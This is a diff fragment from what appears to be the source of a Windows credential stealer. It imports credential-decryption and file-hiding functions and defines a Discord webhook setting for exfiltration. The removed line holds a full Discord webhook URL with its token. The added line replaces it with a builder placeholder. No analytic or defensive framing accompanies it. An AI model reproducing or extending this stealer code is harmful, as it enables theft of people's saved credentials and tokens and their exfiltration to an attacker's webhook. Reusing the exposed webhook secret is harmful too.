@@ -24,7 +24,7 @@ from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
 
-__WEBHOOK__ = "https://discordapp.com/api/webhooks/1094252552876458085/_E6RzrSOhnCPmnvhhX_SC-cV_W5sqN4iIcwOx34tq5UXKCMSPMH9czqRcdWNaKiXr_JZ"
+__WEBHOOK__ = "%webhook_here%"
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
 
